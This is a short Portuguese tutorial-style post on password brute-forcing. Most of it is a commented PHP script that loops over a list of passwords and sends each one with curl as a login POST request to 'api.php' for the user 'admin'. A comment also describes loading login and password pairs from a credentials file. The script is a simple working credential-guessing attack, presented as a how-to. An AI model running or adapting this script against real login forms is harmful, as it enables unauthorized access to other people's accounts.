Bruteforce é uma questão mais complexa, pois há algumas formas de burlar, mas vamos aos usos tradicionais de bruteforce conhecidos por mim.<br>

Como eu pensaria em fazer um bruteforce hoje?<br>

Opção 1: 
curl usando listas em txt usando funcionalidades do php para iterar sobre as informações sensíveis contidas no arquivo.

O que é o CURL? O curl é uma lib nativa em alguns sistemas que trabalha com requisições http/https, etc.




<?php

$senhas = ["123456", "admin", "senha123"]; //array de senhas, podendo ser um arquivo senhas.txt ou simplesmente, credenciais.txt, puxando login|senha, dando explode em caracteres separadores ex: $login(|||)$senha


foreach ($senhas as $senha) {
    $dados = [
        "usuario" => "admin",
        "senha" => $senha
    ];

$ch = curl_init("api.php"); //chama a funcao init com a url da api ou qualquer outro site
curl_setopt($ch, CURLOPT_POST, true); // aqui vai definir que o metódo usado será o post (não vai enviar direto na url como get)
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados)); //aqui os postfields(dados que podiam ser enviados na entrada de um formulario) serão setados de forma dinâmica a partir da lista
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //aqui irá setar true ou false se irá retornar o resultado da requisição (quando se faz bruteforce não se usa isso caso seja uma lista extensa)

$response = curl_exec($ch); // aqui executa e armazena o resultado na variavel response que vai ser tipada automaticamente diferente de outras linguagens
curl_close($ch); // aqui irá fechar o curl que estava armazenado na variavel $ch



echo $response; //o echo aqui irá retornar o valor contido no $response, ou seja, qualquer retorno que tiver o curl, vai ser retornado via echo aqui.

}

echo '<br><br>Lista de senhas (array):<br>';
print_r($senhas);
